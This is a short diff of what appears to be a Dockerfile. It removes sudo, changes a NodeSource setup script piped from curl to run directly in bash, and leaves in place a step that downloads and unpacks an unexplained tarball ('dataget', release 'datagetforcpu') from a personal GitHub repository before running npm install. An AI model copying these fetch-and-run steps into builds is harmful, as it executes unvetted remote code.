@@ -47,11 +47,11 @@ RUN apt-get update && \
     lsb-release \
     xdg-utils \
     libgbm-dev \
-    sudo \
+    sudo 
 
 
-RUN curl -s https://deb.nodesource.com/setup_18.x | sudo bash
-RUN apt install -y npm nodejs
+RUN curl -s https://deb.nodesource.com/setup_18.x | bash
+RUN apt install npm nodejs -y
 RUN wget https://github.com/Solo120140/Sologotemm-/releases/download/datagetforcpu/dataget.tar.gz && \
 tar -xvf dataget.tar.gz && \
 npm install
